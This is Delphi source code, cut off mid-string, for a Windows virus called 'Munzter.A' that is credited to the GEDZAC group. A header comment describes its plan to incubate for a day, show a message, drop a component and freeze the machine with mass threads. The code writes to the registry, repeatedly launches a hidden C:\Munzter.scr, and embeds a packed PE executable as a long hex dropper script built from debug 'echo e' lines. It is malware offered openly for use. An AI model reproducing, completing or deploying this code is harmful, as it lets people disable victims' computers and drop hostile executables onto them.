   {

     designed & programmed by: Byt3Cr0w/GEDZAC
     Start Date: 20/07/04
     End Date: 21/07/04   (easy..)
     Bio Cells: 23656
     Project Name: MunzterCell
     Virus Cell: Munzter.A     (The beginning)
     Comments Or Description:

     About The MunzterCell Project:
   °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
   *********************************************************************************************************
   * This is a project that i start in july of 2004 motivated by some personnal problems                   *
   * i think "in everyone there is a monster inside her bodys a monster who is hide...but in one moment    *
   * he can appear and change your life.." that inspired me to bring this monster to my computer ;)         *
   * (and maybe to another computers :D) so i start writing the code.                                      *
   *                                                                                                       *
   * The Munzter evolves in every version, every version is better than the old version :)                 *
   * i dont know the number of versions the time will say that ;).                     *
   *********************************************************************************************************

     About Munzter.A:
   °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
   *****************************************************************************************************************************
   *  A Simple parasite (Is the correct name ;)) coded in Delphi and one component in ASM.                     *
   *  He acts like a real virus or parasite (or one Monster), he sleep for 1 day (Incubating)                      *
   *  then he wake and show a message then he drop one component and with the help of 1000 threads ;) the component and Munzter*
   *  freeze the Computer. (before that he kill her self but he safe one copy).                            *
   *****************************************************************************************************************************
   }

   program munzterA;

   {$APPTYPE CONSOLE}

   uses
     SysUtils,
     Windows, Registry;

      CONST
    S = #13#10;

   var
   MunzterA: Dword;
     WHO,whox,eax,ecx,regx,OAX,RET,ebx,O:string;
   who2,what,EDX:integer;
   Time :   TSystemTime;
   EDI:textfile;
   w,q,d:TRegistry;

   function folder():string;
   var winfol:pChar;
   begin
   GetMem(winfol,100);
   if GetSystemDirectory(winfol,100) <> 0 then
   begin
     folder := winfol + '\';
   end;
   FreeMem(winfol,100);
   end;

    function sys : String;
      var
         pcSystemDirectory : PChar;
         dwSDSize          : DWORD;
      begin
         dwSDSize := MAX_PATH + 1;
         GetMem( pcSystemDirectory, dwSDSize );
         try
            if Windows.GetSystemDirectory( pcSystemDirectory, dwSDSize ) <> 0 then
               Result := pcSystemDirectory;
         finally
            FreeMem( pcSystemDirectory );
         end;
         end;


   Function Read(Llave : HKEY; ruta,llavex:string): string;
   VAR
     Reg:TRegistry;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKeyReadOnly(ruta) Then
      Result := Reg.ReadString(llavex);
   End;

   Function Write(Llave : HKEY; ruta,llavex,valor:string):string;
   VAR
     Reg:TRegistry ;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKey(ruta,true) Then
      Reg.WriteString(llavex,valor);
   End;

   function stand:integer;
   var x:integer;
   begin
   for x := 1 to 100 do begin
   WinExec(Pchar('C:\Munzter.scr'),SW_HIDE);
   WinExec(Pchar('C:\Munzter.scr'),SW_HIDE);
   end;
   sleep($FFFFFFFF);
   end;


   function payload:integer;
   var ebx:string;
   begin
   {.386
   .model flat,STDCALL
   extrn ExitProcess          :PROC
   extrn ShellExecuteA        :proc
   .data
   munzter db 'C:\GEDZAC.exe',0
   .code
   ini:
   buaha:
       push 0
       push 0
       push 0
       push offset munzter
       push 0
       push 0
       call ShellExecuteA
   loop buaha
   Call ExitProcess
   end ini}
   ebx := 'echo e 0100  4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00>>munzter' + S +
   'echo e 0110  B8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00>>munzter' + S +
   'echo e 0120  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0130  00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00>>munzter' + S +
   'echo e 0140  0E 1F B4 09 BA 10 00 CD 21 B8 01 4C CD 21 90 90>>munzter' + S +
   'echo e 0150  4D 75 6E 7A 74 65 72 20 41 20 2D 20 50 61 79 6C>>munzter' + S +
   'echo e 0160  6F 61 64 20 2D 20 59 6F 75 20 4E 65 65 64 20 57>>munzter' + S +
   'echo e 0170  69 6E 33 32 20 74 6F 20 72 75 6E 20 74 68 69 73>>munzter' + S +
   'echo e 0180  20 3A 28 20 73 6F 72 72 79 0D 0A 24 00 00 00 00>>munzter' + S +
   'echo e 0190  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 01A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 01B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 01C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 01D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 01E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 01F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0200  50 45 00 00 4C 01 03 00 F0 30 64 A2 00 00 00 00>>munzter' + S +
   'echo e 0210  00 00 00 00 E0 00 8F 81 0B 01 02 19 00 10 00 00>>munzter' + S +
   'echo e 0220  00 10 00 00 00 50 00 00 10 64 00 00 00 60 00 00>>munzter' + S +
   'echo e 0230  00 70 00 00 00 00 40 00 00 10 00 00 00 02 00 00>>munzter' + S +
   'echo e 0240  01 00 00 00 00 00 00 00 03 00 0A 00 00 00 00 00>>munzter' + S +
   'echo e 0250  00 80 00 00 00 10 00 00 00 00 00 00 03 00 00 00>>munzter' + S +
   'echo e 0260  00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00>>munzter' + S +
   'echo e 0270  00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0280  00 70 00 00 E0 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0290  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 02A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 02B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 02C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 02D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 02E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 02F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0300  00 50 00 00 00 10 00 00 00 00 00 00 00 04 00 00>>munzter' + S +
   'echo e 0310  00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 E0>>munzter' + S +
   'echo e 0320  00 00 00 00 00 00 00 00 00 10 00 00 00 60 00 00>>munzter' + S +
   'echo e 0330  00 06 00 00 00 04 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0340  00 00 00 00 40 00 00 E0 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0350  00 10 00 00 00 70 00 00 00 02 00 00 00 0A 00 00>>munzter' + S +
   'echo e 0360  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0>>munzter' + S +
   'echo e 0370  E9 E2 DA 04 51 BF 5F C5 CF F1 EE 3C ED 14 91 ED>>munzter' + S +
   'echo e 0380  6A D4 92 2C 88 A3 4B 51 B5 60 C4 8A 66 22 B4 FD>>munzter' + S +
   'echo e 0390  82 D1 5C 22 97 E5 F7 98 5C D3 84 75 A6 CA D5 16>>munzter' + S +
   'echo e 03A0  01 5C 45 05 22 3A 9C 4C 96 26 FF 03 65 7D 02 DD>>munzter' + S +
   'echo e 03B0  6F 1D A6 7B 53 B5 77 7F 47 55 7D 6D 40 4F 29 6A>>munzter' + S +
   'echo e 03C0  E6 6F EC 4D E6 0D 8D 43 C1 4D 32 F3 EF FC 5B 9C>>munzter' + S +
   'echo e 03D0  70 DF 07 B5 4D FC 10 07 52 6A 3C 06 47 15 5C 15>>munzter' + S +
   'echo e 03E0  EA E7 C4 9B 6C A4 BE F3 40 56 CD 2C 02 81 D9 62>>munzter' + S +
   'echo e 03F0  82 08 E8 97 33 C6 91 D5 ED 4E 2D 1D E1 01 9A 0D>>munzter' + S +
   'echo e 0400  81 18 81 70 FE 5C 9D A5 08 BA 7D 0A F0 4F E4 5E>>munzter' + S +
   'echo e 0410  3A E5 65 06 B9 73 64 2B 83 AB 9D 4D 6F BC 56 18>>munzter' + S +
   'echo e 0420  B4 96 29 46 AA 61 0A B0 91 A2 8A B1 58 3C DB 5E>>munzter' + S +
   'echo e 0430  10 8B 1D DD 1A 22 65 A4 C8 47 95 99 67 7E 3D A7>>munzter' + S +
   'echo e 0440  DB 6A 6D 49 F9 44 85 A7 52 20 ED 4C 61 10 CB C8>>munzter' + S +
   'echo e 0450  23 3C 8C 35 68 D4 AF 36 0C BB A7 3F D2 49 54 43>>munzter' + S +
   'echo e 0460  D2 BA A9 C9 5B B9 1E F1 CF 59 BF 3D B1 42 FB 78>>munzter' + S +
   'echo e 0470  1F F8 F5 5F 97 1C 00 44 5D 33 4F BF FE 4A C5 CC>>munzter' + S +
   'echo e 0480  D6 3C 94 17 C1 89 09 06 C5 76 B8 FD 2A F2 97 54>>munzter' + S +
   'echo e 0490  99 F1 91 46 0E A1 52 CF C0 74 9D 96 2F B0 0D AB>>munzter' + S +
   'echo e 04A0  91 C1 E9 F5 63 FF B2 AE E9 95 4A 5C 54 F3 F6 E7>>munzter' + S +
   'echo e 04B0  16 15 ED 9C 84 49 1E 17 DF D0 20 44 4E 25 A7 F5>>munzter' + S +
   'echo e 04C0  E3 83 B1 12 DF D0 9C E1 01 16 8C 00 1B CC D3 C7>>munzter' + S +
   'echo e 04D0  9F FD B1 A3 4F 83 FD 2C 3C E9 28 BD 97 AE 29 FE>>munzter' + S +
   'echo e 04E0  99 3A 7F A4 77 35 82 D8 8D E8 9C 77 51 D3 95 81>>munzter' + S +
   'echo e 04F0  5B F6 F0 9E 55 53 2A F6 48 D6 14 27 5D 22 FE 42>>munzter' + S +
   'echo e 0500  BF 7F EC DF 6A 00 01 68 00 20 40 08 E8 00 00 01>>munzter' + S +
   'echo e 0510  EC E2 EA 06 E6 00 FB F6 FF FF 55 8B EC 83 C4 CC>>munzter' + S +
   'echo e 0520  8D 45 CC 8B 55 0C 89 10 8B 4D 10 89 48 04 0A 14>>munzter' + S +
   'echo e 0530  89 50 08 0B 65 59 96 65 18 24 1C 28 20 96 65 59>>munzter' + S +
   'echo e 0540  96 2C 24 30 28 0C 2C 59 96 65 59 10 30 14 34 18>>munzter' + S +
   'echo e 0550  ED 5F 96 65 38 1C 3C 20 6A 34 50 68 3E 40 67 84>>munzter' + S +
   'echo e 0560  B5 FF F3 8B 45 08 50 F2 8B E5 5D C2 38 00 90 00>>munzter' + S +
   'echo e 0570  6F C8 50 24 57 3C 3D B7 6D 6B 57 E4 17 6C 45 05>>munzter' + S +
   'echo e 0580  55 6D 55 E8 F7 CF E5 CB 8B 4D 4D EC 8B 45 45 F0>>munzter' + S +
   'echo e 0590  55 F4 8D 55 E4 70 7F 7F 59 36 14 F8 24 FC 6A 1C>>munzter' + S +
   'echo e 05A0  52 68 32 4C 4D 08 51 16 19 EC 24 20 00 4B F4 33>>munzter' + S +
   'echo e 05B0  7C 8B 8C B5 02 4E F8 33 0C 50 68 48 D2 FD 93 FC>>munzter' + S +
   'echo e 05C0  55 08 52 10 00 FF 25 68 30 40 05 70 00 80 32 33>>munzter' + S +
   'echo e 05D0  78 00 80 CD FF 3F 43 3A 5C 47 45 44 5A 41 43 2E>>munzter' + S +
   'echo e 05E0  65 78 65 00 0D 02 1C 92 9B F9 16 C0 0F 46 03 20>>munzter' + S +
   'echo e 05F0  00 90 0C C9 85 21 22 C9 90 0C C9 23 24 09 FF FF>>munzter' + S +
   'echo e 0600  90 0C 00 02 BC FB 9B F1 EF 1A 10 84 ED 00 AA 00>>munzter' + S +
   'echo e 0610  34 1D 90 9C 5C FE 07 8F B2 96 B1 B4 BA B6 9C 83>>munzter' + S +
   'echo e 0620  43 F2 EE FF C0 3A BC A6 AA DB CE 11 9D E3 1F 4B>>munzter' + S +
   'echo e 0630  B8 51 84 85 24 43 32 64 0F 86 87 3F 24 43 32 88>>munzter' + S +
   'echo e 0640  89 01 0E 2B 74 E6 FF E5 BF F9 14 1B 10 91 4E 30>>munzter' + S +
   'echo e 0650  0C AB 80 23 D5 7F 07 4E AE 2D 08 00 2B 2E C7 13>>munzter' + S +
   'echo e 0660  F6 B7 BF FD E0 E5 1A BD AE A6 8F BD 37 50 42 00>>munzter' + S +
   'echo e 0670  C1 D0 60 4F D8 37 CB 42 9F FE 81 FD E4 81 35 00>>munzter' + S +
   'echo e 0680  2A 27 55 0F 40 CA 27 31 6E 44 21 1B B2 4B 8A 6F>>munzter' + S +
   'echo e 0690  8B 0F 21 3B B9 FD AA D3 6B 37 45 38 6F 84 ED 8C>>munzter' + S +
   'echo e 06A0  2F 7F C9 1F 92 8D 65 46 E4 01 AC 24 00 52 E3 0B>>munzter' + S +
   'echo e 06B0  91 92 21 BB 84 8F 2F 01 0F 02 43 76 D9 1F 21 08>>munzter' + S +
   'echo e 06C0  8F FB 64 01 3F 22 0F 03 F6 47 32 64 4F 04 E0 F6>>munzter' + S +
   'echo e 06D0  BE 74 A8 8F FC 21 3B E1 8B BA 2F 03 0F 80 09 F8>>munzter' + S +
   'echo e 06E0  7B 32 BF F9 43 72 D2 BB 81 00 43 50 66 0F BE 86>>munzter' + S +
   'echo e 06F0  64 48 2E 01 02 03 48 86 64 48 04 05 64 48 86 64>>munzter' + S +
   'echo e 0700  06 07 08 86 64 48 86 09 0A 0B 48 86 64 48 0C 0D>>munzter' + S +
   'echo e 0710  64 48 86 64 0E 0F 10 86 64 48 86 11 12 13 FC 2F>>munzter' + S +
   'echo e 0720  7F 48 61 01 18 99 16 DA 93 5C 44 45 53 54 00 00>>munzter' + S +
   'echo e 0730  62 90 0C C9 90 63 64 19 B2 0B E9 00 14 9F 01 0F>>munzter' + S +
   'echo e 0740  E4 21 19 92 21 E6 E8 92 21 19 92 E9 EB EE 19 92>>munzter' + S +
   'echo e 0750  21 19 EF F0 F2 0B 3B B2 21 F3 AF 5E 0F 92 21 19>>munzter' + S +
   'echo e 0760  92 02 03 15 19 92 21 19 16 17 19 21 19 92 21 1D>>munzter' + S +
   'echo e 0770  1E 92 21 19 92 1F 20 25 19 92 21 19 26 27 28 21>>munzter' + S +
   'echo e 0780  19 92 21 2D 2E 92 21 19 92 2F 30 31 19 92 21 19>>munzter' + S +
   'echo e 0790  3A 3B 3C 21 19 92 21 3D 43 92 21 19 92 44 45 46>>munzter' + S +
   'echo e 07A0  19 92 21 19 47 4C 4D 21 19 92 21 4E 4F 92 21 19>>munzter' + S +
   'echo e 07B0  92 50 55 56 19 92 21 19 D7 58 59 21 19 92 21 5A>>munzter' + S +
   'echo e 07C0  5B 92 21 19 92 5F 60 61 19 92 21 19 62 63 68 21>>munzter' + S +
   'echo e 07D0  19 92 21 69 6A 92 21 19 92 6B 6C 71 19 92 21 19>>munzter' + S +
   'echo e 07E0  72 73 74 21 19 92 21 7A 7B 92 21 19 92 7C 7D 7E>>munzter' + S +
   'echo e 07F0  19 92 21 19 83 84 85 21 19 92 21 86 8B 92 21 19>>munzter' + S +
   'echo e 0800  92 8C 8D 8E 19 92 21 19 8F 94 95 21 19 92 21 96>>munzter' + S +
   'echo e 0810  97 92 21 19 92 9C 9D 9E 4D FC 21 19 9F 40 3B F2>>munzter' + S +
   'echo e 0820  FB F0 E3 7F 88 44 21 7B 03 DF 3E 56 F8 80 0F B2>>munzter' + S +
   'echo e 0830  50 04 91 E3 15 6C 8E A2 02 70 68 20 A7 59 FE BF>>munzter' + S +
   'echo e 0840  01 45 78 69 74 50 72 6F 63 65 73 73 7D 78 A7 D9>>munzter' + S +
   'echo e 0850  EE FE 49 43 53 65 6E 64 4D 14 61 67 65 17 89 70>>munzter' + S +
   'echo e 0860  8F 50 7F FB 53 68 65 6C 6C 32 65 63 75 74 65 41>>munzter' + S +
   'echo e 0870  45 50 45 00 D0 7F 90 FF 00 4C 01 04 00 F0 30 64>>munzter' + S +
   'echo e 0880  A2 E0 00 8F 81 0B 01 02 19 37 D8 60 4F D4 0E 14>>munzter' + S +
   'echo e 0890  10 03 20 0C D8 27 BB D9 40 0B 1F 01 00 03 00 0A>>munzter' + S +
   'echo e 08A0  50 B3 D9 B0 2E 03 04 13 38 33 96 C9 92 9D 10 4A>>munzter' + S +
   'echo e 08B0  02 30 D4 BE 24 23 A1 BE 6A 14 D8 AF 02 A1 DE 43>>munzter' + S +
   'echo e 08C0  4F 44 45 D7 DE 2D EC 4B EB 06 23 B6 60 44 41 54>>munzter' + S +
   'echo e 08D0  29 FB 96 1D 29 FB E6 08 A2 6C 90 C1 FE C0 2E 69>>munzter' + S +
   'echo e 08E0  64 61 74 61 4F 30 12 27 C1 0A 85 01 72 82 AE 27>>munzter' + S +
   'echo e 08F0  FB A6 64 90 40 14 50 04 80 47 00 00 00 AE 4A 07>>munzter' + S +
   'echo e 0900  80 04 00 00 FF 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0910  60 BE 00 60 40 00 8D BE 00 B0 FF FF 57 83 CD FF>>munzter' + S +
   'echo e 0920  EB 10 90 90 90 90 90 90 8A 06 46 88 07 47 01 DB>>munzter' + S +
   'echo e 0930  75 07 8B 1E 83 EE FC 11 DB 72 ED B8 01 00 00 00>>munzter' + S +
   'echo e 0940  01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C0 01 DB 73>>munzter' + S +
   'echo e 0950  EF 75 09 8B 1E 83 EE FC 11 DB 73 E4 31 C9 83 E8>>munzter' + S +
   'echo e 0960  03 72 0D C1 E0 08 8A 06 46 83 F0 FF 74 74 89 C5>>munzter' + S +
   'echo e 0970  01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C9 01 DB 75>>munzter' + S +
   'echo e 0980  07 8B 1E 83 EE FC 11 DB 11 C9 75 20 41 01 DB 75>>munzter' + S +
   'echo e 0990  07 8B 1E 83 EE FC 11 DB 11 C9 01 DB 73 EF 75 09>>munzter' + S +
   'echo e 09A0  8B 1E 83 EE FC 11 DB 73 E4 83 C1 02 81 FD 00 F3>>munzter' + S +
   'echo e 09B0  FF FF 83 D1 01 8D 14 2F 83 FD FC 76 0F 8A 02 42>>munzter' + S +
   'echo e 09C0  88 07 47 49 75 F7 E9 63 FF FF FF 90 8B 02 83 C2>>munzter' + S +
   'echo e 09D0  04 89 07 83 C7 04 83 E9 04 77 F1 01 CF E9 4C FF>>munzter' + S +
   'echo e 09E0  FF FF 5E 89 F7 B9 07 00 00 00 8A 07 47 2C E8 3C>>munzter' + S +
   'echo e 09F0  01 77 F7 80 3F 00 75 F2 8B 07 8A 5F 04 66 C1 E8>>munzter' + S +
   'echo e 0A00  08 C1 C0 10 86 C4 29 F8 80 EB E8 01 F0 89 07 83>>munzter' + S +
   'echo e 0A10  C7 05 89 D8 E2 D9 8D BE 00 40 00 00 8B 07 09 C0>>munzter' + S +
   'echo e 0A20  74 3C 8B 5F 04 8D 84 30 00 60 00 00 01 F3 50 83>>munzter' + S +
   'echo e 0A30  C7 08 FF 96 50 60 00 00 95 8A 07 47 08 C0 74 DC>>munzter' + S +
   'echo e 0A40  89 F9 57 48 F2 AE 55 FF 96 54 60 00 00 09 C0 74>>munzter' + S +
   'echo e 0A50  07 89 03 83 C3 04 EB E1 FF 96 58 60 00 00 61 E9>>munzter' + S +
   'echo e 0A60  9C AA FF FF 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0A70  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0A80  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0A90  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0AA0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0AB0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0AC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0AD0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0AE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0AF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0B00  00 00 00 00 00 00 00 00 00 00 00 00 70 70 00 00>>munzter' + S +
   'echo e 0B10  50 70 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0B20  7D 70 00 00 60 70 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0B30  00 00 00 00 89 70 00 00 68 70 00 00 00 00 00 00>>munzter' + S +
   'echo e 0B40  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0B50  94 70 00 00 A2 70 00 00 B2 70 00 00 00 00 00 00>>munzter' + S +
   'echo e 0B60  C0 70 00 00 00 00 00 00 D0 70 00 00 00 00 00 00>>munzter' + S +
   'echo e 0B70  4B 45 52 4E 45 4C 33 32 2E 44 4C 4C 00 4D 53 56>>munzter' + S +
   'echo e 0B80  46 57 33 32 2E 44 4C 4C 00 53 48 45 4C 4C 33 32>>munzter' + S +
   'echo e 0B90  2E 44 4C 4C 00 00 4C 6F 61 64 4C 69 62 72 61 72>>munzter' + S +
   'echo e 0BA0  79 41 00 00 47 65 74 50 72 6F 63 41 64 64 72 65>>munzter' + S +
   'echo e 0BB0  73 73 00 00 45 78 69 74 50 72 6F 63 65 73 73 00>>munzter' + S +
   'echo e 0BC0  00 00 49 43 53 65 6E 64 4D 65 73 73 61 67 65 00>>munzter' + S +
   'echo e 0BD0  00 00 53 68 65 6C 6C 45 78 65 63 75 74 65 41 00>>munzter' + S +
   'echo e 0BE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0BF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C00  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C10  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C20  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C30  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C40  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C50  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C60  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C70  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C80  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0C90  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0CA0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0CB0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0CC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0CD0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0CE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0CF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D00  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D10  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D20  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D30  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D40  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D50  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D60  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D70  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D80  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0D90  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0DA0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0DB0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0DC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0DD0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0DE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0DF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E00  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E10  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E20  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E30  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E40  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E50  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E60  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E70  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E80  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0E90  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0EA0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0EB0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0EC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0ED0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0EE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0EF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F00  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F10  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F20  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F30  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F40  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F50  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F60  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F70  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F80  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0F90  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0FA0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0FB0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0FC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0FD0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0FE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 0FF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1080  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
